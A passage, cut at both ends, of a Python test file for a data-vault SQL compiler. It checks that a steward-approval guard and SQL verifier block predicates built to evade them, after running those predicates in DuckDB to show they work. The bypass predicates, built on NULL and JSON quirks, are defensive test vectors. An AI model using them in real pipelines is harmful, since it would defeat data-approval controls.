                for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, pred)

    # 4. Valid non-boolean controls (0 FPs) + 3-level correlated shadowing + 80/80 bundles
    valid_controls = (
        ("duckdb_local", "MAP_KEYS(MAP {'a': TRUE})[1]"),
        ("duckdb_local", "MAP_KEYS(s.m)"),
        ("duckdb_local", "LIST_TRANSFORM(['a'], lambda x, i: x || 'b')[1]"),
        ("duckdb_local", "LIST_REDUCE(['a', 'b'], lambda a, b: a || b)"),
        ("duckdb_local", "CONCAT('a', 'b')"),
        ("duckdb_local", "REPEAT('00', 32)"),
        ("duckdb_local", "CONSTANT_OR_NULL('ok', 1)"),
        ("duckdb_local", "(SELECT x FROM (SELECT 'ok' AS x) AS inner_t)"),
        (
            "duckdb_local",
            "(SELECT sub.ok FROM (SELECT TRUE AS x) AS t "
            "JOIN (SELECT COALESCE(x, 'abc') AS ok FROM staging.t2) AS sub ON TRUE)",
        ),
        ("duckdb_local", "NULLIF('ok', (SELECT 'ok' LIMIT 0))"),
    )
    for ok_tid, ok_expr in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} = ANY(s.arr)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)



    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter35_any_nullable_json_branches_oob_and_container_edge_cases() -> None:
    """Remediate r2 any-nullable _chk, JSON multi-branch/->>, SetOp, OOB/slice, HOF, and scalar NULL gaps."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    # 1. Live DuckDB proof of r2 bypasses & valid controls
    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[], m MAP(VARCHAR, VARCHAR))"
    )
    ddb.execute(
        "INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'], MAP {'a': 'ok'})"
    )
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")
    ddb.execute("CREATE TABLE staging.t2 (x VARCHAR)")
    ddb.execute("INSERT INTO staging.t2 VALUES ('ok')")

    arr_260 = "[" + ",".join(["'a'"] * 259 + ["NULL"]) + "]"
    arr_257 = "[" + ",".join(["'a'", "'b'"] + [f"'{i}'" for i in range(255)]) + "]"
    live_bool_preds = (
        "JSON_EXTRACT(CASE WHEN s.id = 1 THEN '{\"a\": \"ok\"}' ELSE '{\"a\": true}' END, '$.a') = ANY(s.b)",
        "LIST_REDUCE(CAST([] AS BOOLEAN[]), lambda a, b: b, TRUE) = ANY(s.b)",
        "LIST_REDUCE(LIST_FILTER([1], lambda x: FALSE), lambda a, b: b, TRUE) = ANY(s.b)",
        "(SELECT [TRUE] UNION ALL SELECT [TRUE] LIMIT 1)[1] = ANY(s.b)",
        "(SELECT {'a': TRUE} UNION ALL SELECT {'a': TRUE} LIMIT 1).a = ANY(s.b)",
        "(SELECT [TRUE] UNION SELECT [TRUE])[1] = ANY(s.b)",
        "(SELECT {'a': TRUE} UNION SELECT {'a': TRUE}).a = ANY(s.b)",
    )
    live_null_preds = (
        "IF(s.id = 2, NULL, 'ok') = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN s.id = 2 THEN NULL ELSE 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "CASE s.id WHEN 2 THEN NULL ELSE 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT x FROM (VALUES (NULL), ('ok')) AS v(x) LIMIT 1) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT NULL UNION ALL SELECT 'ok' LIMIT 1) = ALL(SELECT x FROM staging.empty_t)",
        "IF(s.id = 2, [], ['a'])[1] = ALL(SELECT x FROM staging.empty_t)",
        "CASE WHEN s.id = 2 THEN [] ELSE ['a'] END[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM(IF(s.id = 2, [], ['a']), lambda x: x)[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_REDUCE([]::VARCHAR[], lambda a, x: 'ok', NULL) = ALL(SELECT x FROM staging.empty_t)",
        f"LIST_REDUCE({arr_260}, lambda a, x: x) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_REDUCE(['a', 'b', 'c'], lambda a, b: CASE WHEN a = 'ab' THEN NULL ELSE CONCAT(a, b) END) = ALL(SELECT x FROM staging.empty_t)",
        f"LIST_REDUCE({arr_257}, lambda a, b: CASE WHEN a = 'ab' THEN NULL ELSE a || b END) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM(NULL::VARCHAR[], lambda x: 'constant')[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM((SELECT ['ok'] LIMIT 0), lambda x: 'constant')[1] = ALL(SELECT x FROM staging.empty_t)",
        "COALESCE((SELECT LIST_TRANSFORM((SELECT ['ok'] LIMIT 0), lambda x: 'constant')), [NULL])[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_FILTER(['a', 'b'], lambda x, i: i = 99)[1] = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' FROM UNNEST(CAST([] AS VARCHAR[]))) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' FROM UNNEST(RANGE(0))) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' FROM UNNEST(LIST_FILTER([1], lambda x: FALSE))) = ALL(SELECT x FROM staging.empty_t)",
        "['ok', (SELECT (SELECT 'a' LIMIT 0))][2] = ALL(SELECT x FROM staging.empty_t)",
        "['ok', NULLIF(s.hk, s.hk)][2] = ALL(SELECT x FROM staging.empty_t)",
        "['a', LIST_MAX(CAST([] AS VARCHAR[]))][2] = ALL(SELECT x FROM staging.empty_t)",
        "['a', ['b', NULL][2]][2] = ALL(SELECT x FROM staging.empty_t)",
        "['a', 'b'][3] = ALL(SELECT x FROM staging.empty_t)",
        "['a'][0] = ALL(SELECT x FROM staging.empty_t)",
        "['a'][-5] = ALL(SELECT x FROM staging.empty_t)",
        "['a'][2:3][1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_EXTRACT(['a', 'b'], 3) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_EXTRACT(['a'], 0) = ALL(SELECT x FROM staging.empty_t)",
        "['a'][NULL] = ALL(SELECT x FROM staging.empty_t)",
        "MAP {'a': 'ok'}[NULL] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_SLICE(['a'], 2, 3)[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_SLICE(['a'], 5, 6)[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_TRANSFORM([1, 2], lambda x, i: x)[3] = ALL(SELECT 1 WHERE FALSE)",
        "COALESCE(['a'][2], NULL) = ALL(SELECT x FROM staging.empty_t)",
        "ARRAY_INTERSECT(['a'], ['b'])[1] = ALL(SELECT x FROM staging.empty_t)",
        "REPEAT(['ok'], NULL)[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_RESIZE(['a'], NULL)[1] = ALL(SELECT x FROM staging.empty_t)",
        "('a' || NULL) = ALL(SELECT x FROM staging.empty_t)",
        "(1 + NULL) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF('a' || NULL, 'x') = ALL(SELECT x FROM staging.empty_t)",
        "(CASE WHEN NOT ((-NULL) IS NULL) THEN 'ok' END) = ALL(SELECT x FROM staging.empty_t)",
        "(CASE WHEN (-NULL) = 1 THEN 'ok' END) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CONCAT('a', 'b'), 'ab') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CONCAT('a', 1), 'a1') = ALL(SELECT x FROM staging.empty_t)",
        "(CASE WHEN CONCAT('a', 'b') = 'cd' THEN 'ok' END) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF((SELECT v || 'b' FROM (SELECT 'a' AS v) AS sub), 'ab') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT_STRING('{\"a\":null}', '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "('{\"a\":null}'::JSON->>'a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_ARRAY_LENGTH('123') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_POSITION(['a'], 'z') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_INDEXOF(['a'], 'z') = ALL(SELECT 1 WHERE FALSE)",
        "ARRAY_TO_STRING(CAST([] AS VARCHAR[]), ',') = ALL(SELECT x FROM staging.empty_t)",
        "LIST_AGGR([1], 'stddev') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_AGGR([1], 'variance') = ALL(SELECT 1 WHERE FALSE)",
        "LIST_AGGR(['a', NULL], 'last') = ALL(SELECT x FROM staging.empty_t)",
        "LIST_AGGR([NULL, 'a'], 'first') = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT x FROM (SELECT LAG(s.hk) OVER () AS x FROM staging.s) AS w LIMIT 1) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT NTH_VALUE('ok', 2) OVER () FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
    )
    for pred in (*live_bool_preds, *live_null_preds):
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    for ctrl_expr in (
        "ARRAY_CONCAT([], ['a'])[1]",
        "MAP_CONCAT(MAP {}, MAP {'a': 'x'})['a']",
        "('{\"a\": true}'::JSON->>'a')",
        "JSON_EXTRACT_STRING('{\"a\": true}', '$.a')",
        "JSON_ARRAY_LENGTH('[1, 2]')",
        "LIST_TRANSFORM(['a'], lambda x, i: x || 'b')[1]",
        "LIST_FILTER(['a', 'b'], lambda x: x = 'a')[1]",
        "LIST_REDUCE(['a', 'b'], lambda a, b: a || b)",
        "MAP_KEYS(MAP {'a': TRUE})[1]",
        "ARRAY_INTERSECT(['a'], ['a'])[1]",
        "LIST_AGGR([1, 2], 'stddev')",
        "CONCAT('a', NULL)",
    ):
        assert ddb.execute(f"SELECT {ctrl_expr}").fetchone() is not None, ctrl_expr
    ddb.close()

    # 2. Verify DuckDB + cross-dialect bypasses blocked across DV-AST-006, DV-AST-007, TargetEvalGate
    all_vectors: list[tuple[str, str]] = [
        ("duckdb_local", p) for p in (*live_bool_preds, *live_null_preds)
    ] + [
        ("databricks_uc", "REDUCE(ARRAY(), TRUE, (a, b) -> b) = ANY(s.b)"),
        ("sqlserver_fabric", "TRY_CONVERT(INT, 'abc') = ALL(SELECT 1 WHERE FALSE)"),
        ("sqlserver_fabric", "CHOOSE(1, TRUE, FALSE) = ANY(s.b)"),
    ]
    for tid, pred in all_vectors:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred[:80]
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred[:80])
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, tid)
        ), (tid, pred[:80])
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    # 3. Portable 8/8 SQL_TARGET_IDS coverage
    portable_preds = (
        "CASE WHEN s.id = 2 THEN NULL ELSE 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "CASE s.id WHEN 2 THEN NULL ELSE 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT x FROM (VALUES (NULL), ('ok')) AS v(x) LIMIT 1) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT NULL UNION ALL SELECT 'ok' LIMIT 1) = ALL(SELECT x FROM staging.empty_t)",
        "('a' || NULL) = ALL(SELECT x FROM staging.empty_t)",
        "(1 + NULL) = ALL(SELECT 1 WHERE FALSE)",
        "(CASE WHEN NOT ((-NULL) IS NULL) THEN 'ok' END) = ALL(SELECT x FROM staging.empty_t)",
        "(CASE WHEN (-NULL) = 1 THEN 'ok' END) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CONCAT('a', 'b'), 'ab') = ALL(SELECT x FROM staging.empty_t)",
        "(CASE WHEN CONCAT('a', 'b') = 'cd' THEN 'ok' END) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF((SELECT v || 'b' FROM (SELECT 'a' AS v) AS sub), 'ab') = ALL(SELECT x FROM staging.empty_t)",
    )
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for pred in portable_preds:
            u_sql = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
            )
            try:
                ast = sqlglot.parse_one(u_sql, read=dialect)
            except Exception:
                continue
            assert has_steward_approved_guard(ast) is False, (tid, pred)
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, pred)

    # 4. allow_null=False vs allow_null=True distinction on no-ELSE CASE
    no_else_case = sqlglot.parse_one("CASE WHEN s.id = 1 THEN 'a' END", read="duckdb")
    assert is_bool_or_null_expr(no_else_case, allow_null=False) is False
    assert is_bool_or_null_expr(no_else_case, allow_null=True) is True

    # 5. Valid non-boolean controls (0 FPs) + staging.t2 shadowing + 80/80 compiled bundles
    valid_controls = (
        ("duckdb_local", "ARRAY_CONCAT([], ['a'])[1]"),
        ("duckdb_local", "MAP_CONCAT(MAP {}, MAP {'a': 'x'})['a']"),
        ("duckdb_local", "('{\"a\": true}'::JSON->>'a')"),
        ("duckdb_local", "JSON_EXTRACT_STRING('{\"a\": true}', '$.a')"),
        ("duckdb_local", "JSON_ARRAY_LENGTH('[1, 2]')"),
        ("duckdb_local", "LIST_TRANSFORM(['a'], lambda x, i: x || 'b')[1]"),
        ("duckdb_local", "LIST_FILTER(['a', 'b'], lambda x: x = 'a')[1]"),
        ("duckdb_local", "LIST_REDUCE(['a', 'b'], lambda a, b: a || b)"),
        ("duckdb_local", "MAP_KEYS(MAP {'a': TRUE})[1]"),
        ("duckdb_local", "MAP_KEYS(s.m)"),
        ("duckdb_local", "ARRAY_INTERSECT(['a'], ['a'])[1]"),
        ("duckdb_local", "LIST_AGGR([1, 2], 'stddev')"),
        ("duckdb_local", "CONCAT('a', NULL)"),
        (
            "duckdb_local",
            "(SELECT sub.ok FROM (SELECT TRUE AS x) AS t "
            "JOIN (SELECT COALESCE(x, 'abc') AS ok FROM staging.t2) AS sub ON TRUE)",
        ),
    )
    for ok_tid, ok_expr in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} = ANY(s.arr)"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)



    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter36_r3_cast_hof_slice_json_map_window_and_scalar_nulls() -> None:
    """Remediate all 6 converged r3 findings with 0 FPs across controls and 80/80 bundles."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[], m MAP(VARCHAR, VARCHAR))"
    )
    ddb.execute(
        "INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'], MAP {'a': 'ok'})"
    )
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")

    live_preds = (
        # 1. Cast / Convert nullable-boolean branches
        "CAST(CASE WHEN s.id = 2 THEN NULL ELSE TRUE END AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(IF(s.id = 2, NULL, TRUE) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(NULLIF(TRUE, TRUE) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST((SELECT CASE WHEN s.id = 2 THEN NULL ELSE TRUE END) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(CASE WHEN s.id = 2 THEN NULL ELSE (1 = 1) END AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(TRY_CAST('bad' AS BOOLEAN) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        # 2. Direct LIST_TRANSFORM/LIST_FILTER NULL, LIST_AGGR(..., 'list'), SKEWNESS/KURTOSIS
        "LIST_TRANSFORM(NULL::VARCHAR[], lambda x: 'constant') = ALL(SELECT [x] FROM staging.empty_t)",
        "LIST_FILTER(NULL::VARCHAR[], lambda x: TRUE) = ALL(SELECT [x] FROM staging.empty_t)",
        "LIST_TRANSFORM((SELECT ['ok'] LIMIT 0), lambda x: 'constant') = ALL(SELECT [x] FROM staging.empty_t)",
        "COALESCE(LIST_TRANSFORM(NULL::VARCHAR[], lambda x: 'constant'), NULL) = ALL(SELECT [x] FROM staging.empty_t)",
        "CASE WHEN s.id = 2 THEN LIST_TRANSFORM(NULL::VARCHAR[], lambda x: 'constant') ELSE ['ok'] END = ALL(SELECT [x] FROM staging.empty_t)",
        "LIST_AGGR([TRUE], 'list')[1] = ANY(s.b)",
        "LIST_AGGR([], 'list')[1] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_AGGR(['a'], 'list')[2] = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT UNNEST(LIST_AGGR([], 'list'))) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_AGGR([], 'list') = ALL(SELECT [x] FROM staging.empty_t)",
        "LIST_AGGR([1, 2], 'skewness') = ALL(SELECT 1.0 WHERE FALSE)",
        "LIST_AGGR([1, 2], 'kurtosis') = ALL(SELECT 1.0 WHERE FALSE)",
        "LIST_AGGR([1, 1, 1], 'skewness') = ALL(SELECT 1.0 WHERE FALSE)",
        "LIST_AGGR([1, 1, 1, 1], 'kurtosis') = ALL(SELECT 1.0 WHERE FALSE)",
        "LIST_AGGR([1, 2, 3, NULL], 'kurtosis') = ALL(SELECT 1.0 WHERE FALSE)",
        # 3. NULL-dropping transforms & stepped slices / RANGE
        "MAP_KEYS(NULL::MAP(VARCHAR, VARCHAR))[1] = ALL(SELECT x FROM staging.empty_t)",
        "MAP_VALUES(NULL::MAP(VARCHAR, VARCHAR))[1] = ALL(SELECT x FROM staging.empty_t)",
        "MAP_ENTRIES(NULL::MAP(VARCHAR, VARCHAR))[1] = ALL(SELECT {'key': 'a', 'value': 'b'} WHERE FALSE)",
        "MAP_FROM_ENTRIES(NULL::STRUCT(k VARCHAR, v VARCHAR)[])['a'] = ALL(SELECT x FROM staging.empty_t)",
        "FLATTEN(NULL::VARCHAR[][])[1] = ALL(SELECT x FROM staging.empty_t)",
        "['a', 'b'][1:2:2][2] = ALL(SELECT x FROM staging.empty_t)",
        "LIST_SLICE(['a', 'b'], 1, 2, 2)[2] = ALL(SELECT x FROM staging.empty_t)",
        "RANGE(0, 5, -1)[1] = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT 'ok' FROM UNNEST(RANGE(0, 5, -1))) = ALL(SELECT x FROM staging.empty_t)",
        "LIST_SLICE(['a', 'b'], 1, 2, -1)[1] = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT 'ok' FROM UNNEST(LIST_SLICE(['a', 'b'], 1, 2, -1))) = ALL(SELECT x FROM staging.empty_t)",
        # 4. JSONPath subscript OOB, 2-arg JSON_*, constant-concatenated JSON
        "JSON_EXTRACT('[\"a\"]', '$[5]') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT_STRING('[\"a\"]', '$[5]') = ALL(SELECT x FROM staging.empty_t)",
        "('[\"a\"]'::JSON->>'$[5]') = ALL(SELECT x FROM staging.empty_t)",
        "('[\"a\"]'::JSON->>5) = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT('{\"a\": [1]}', '$.a[5]') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_ARRAY_LENGTH('[1, 2]', '$.missing') = ALL(SELECT 1 WHERE FALSE)",
        "JSON_ARRAY_LENGTH('[1, 2]', '$[99]') = ALL(SELECT 1 WHERE FALSE)",
        "JSON_KEYS('{\"a\": 1}', '$.missing') = ALL(SELECT ['a'] WHERE FALSE)",
        "JSON_TYPE('{\"a\": 1}', '$.missing') = ALL(SELECT x FROM staging.empty_t)",
        "('{' || '\"k\": null}')::JSON->>'k' = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT_STRING(CONCAT('{\"k\":', ' null}'), '$.k') = ALL(SELECT x FROM staging.empty_t)",
        # 5. MAP non-string, case-sensitive, and expression keys
        "MAP {1: 'ok'}[2] = ALL(SELECT x FROM staging.empty_t)",
        "MAP {'a': 'ok'}['A'] = ALL(SELECT x FROM staging.empty_t)",
        "MAP {'a': 'ok'}[('b')] = ALL(SELECT x FROM staging.empty_t)",
        "MAP {'a': 'ok'}['a' || 'b'] = ALL(SELECT x FROM staging.empty_t)",
        # 6. Filter/Window frames, NULL-strict scalar functions, constant string/cast folding
        "(SELECT MAX('ok') FILTER (WHERE FALSE) OVER () FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT FIRST_VALUE('ok') OVER (ROWS BETWEEN 1 FOLLOWING AND 2 FOLLOWING) FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT MAX('ok') OVER (ROWS BETWEEN 2 PRECEDING AND 1 PRECEDING) FROM (SELECT 1) AS w) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST('1' AS INT), 1) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(CAST(1 AS DOUBLE), 1.0) = ALL(SELECT 1.0 WHERE FALSE)",
        "CONCAT_WS(NULL, 'a', 'b') = ALL(SELECT x FROM staging.empty_t)",
        "UPPER(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "LOWER(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "TRIM(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "ABS(NULL::INT) = ALL(SELECT 1 WHERE FALSE)",
        "LENGTH(NULL) = ALL(SELECT 1 WHERE FALSE)",
        "REPLACE(NULL, 'a', 'b') = ALL(SELECT x FROM staging.empty_t)",
        "ROUND(NULL::DOUBLE, 2) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(UPPER('a'), 'A') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(LOWER('A'), 'a') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(TRIM(' a '), 'a') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(SUBSTR('abc', 1, 2), 'ab') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(REPLACE('abc', 'b', 'x'), 'axc') = ALL(SELECT x FROM staging.empty_t)",
        "REGEXP_REPLACE(NULL, 'a', 'b') = ALL(SELECT x FROM staging.empty_t)",
        "DATE_TRUNC('day', CAST(NULL AS DATE)) = ALL(SELECT DATE '2020-01-01' WHERE FALSE)",
        "STRFTIME(CAST(NULL AS DATE), '%Y') = ALL(SELECT x FROM staging.empty_t)",
        "LEFT(NULL, 1) = ALL(SELECT x FROM staging.empty_t)",
        "RIGHT(NULL, 1) = ALL(SELECT x FROM staging.empty_t)",
        "SPLIT_PART(NULL, ',', 1) = ALL(SELECT x FROM staging.empty_t)",
        "INSTR(NULL, 'a') = ALL(SELECT 1 WHERE FALSE)",
        "MD5(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "SHA256(NULL) = ALL(SELECT x FROM staging.empty_t)",
        "PRINTF('%s', NULL) = ALL(SELECT x FROM staging.empty_t)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    valid_controls = (
        ("duckdb_local", "CAST(TRUE AS VARCHAR)"),
        ("duckdb_local", "CAST(COALESCE(NULL, TRUE) AS VARCHAR)"),
        ("duckdb_local", "CAST(TRY_CAST('true' AS BOOLEAN) AS VARCHAR)"),
        ("duckdb_local", "LIST_TRANSFORM(['a'], lambda x, i: x || 'b')[1]"),
        ("duckdb_local", "LIST_FILTER(['a', 'b'], lambda x: x = 'a')[1]"),
        ("duckdb_local", "LIST_AGGR(['a'], 'list')[1]"),
        ("duckdb_local", "LIST_AGGR([1, 2, 3], 'skewness')"),
        ("duckdb_local", "LIST_AGGR([1, 2, 3, 10], 'kurtosis')"),
        ("duckdb_local", "ARRAY_CONCAT(['a'], IF(s.id = 2, ['x'], ['y']))[2]"),
        ("duckdb_local", "LIST_SLICE(['a', 'b', 'c'], 1, 3, 2)[2]"),
        ("duckdb_local", "LIST_SLICE(['a', 'b'], 2, 1, -1)[2]"),
        ("duckdb_local", "RANGE(5, 0, -1)[2]"),
        ("duckdb_local", "JSON_EXTRACT_STRING('[\"a\"]', '$[0]')"),
        ("duckdb_local", "JSON_ARRAY_LENGTH('{\"a\": [1, 2]}', '$.a')"),
        ("duckdb_local", "JSON_ARRAY_LENGTH('[1, 2]')"),
        ("duckdb_local", "JSON_TYPE('{\"a\": 1}', '$.a')"),
        ("duckdb_local", "JSON_KEYS('{\"a\": 1}')"),
        ("duckdb_local", "MAP {'a': 'ok'}['a']"),
        ("duckdb_local", "MAP {1: 'ok'}[1]"),
        ("duckdb_local", "MAP {'a': 'ok'}[('a')]"),
        ("duckdb_local", "CONCAT_WS(',', NULL, 'b')"),
        ("duckdb_local", "(SELECT MAX('ok') FILTER (WHERE TRUE) OVER () FROM (SELECT 1) AS w)"),
        ("duckdb_local", "(SELECT MAX('ok') OVER () FROM (SELECT 1) AS w)"),
        (
            "duckdb_local",
